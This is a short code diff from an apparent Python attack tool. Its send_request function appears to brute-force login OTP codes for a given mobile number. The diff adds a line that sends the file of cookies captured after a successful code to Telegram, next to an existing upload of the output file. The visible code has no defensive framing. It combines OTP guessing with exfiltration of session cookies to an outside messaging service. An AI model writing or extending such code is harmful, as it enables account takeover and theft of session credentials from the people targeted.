@@ -92,6 +92,8 @@ def send_request(host, login_otp_nonce, mobile, code_values, counter, max_retrie
                     progress_log.append(f"Output saved in {output_file}")
                     socketio.emit('update_progress', {'log': progress_log[-1]})
                     send_file_to_telegram(output_file)
+                    # Send cookies file to Telegram as well
+                    send_file_to_telegram(f"cookies_success_{code_str}.txt")
                     return True
                 else:
                     progress_log.append(f"Failed with code {code_str} (number {counter}): {json_response}")
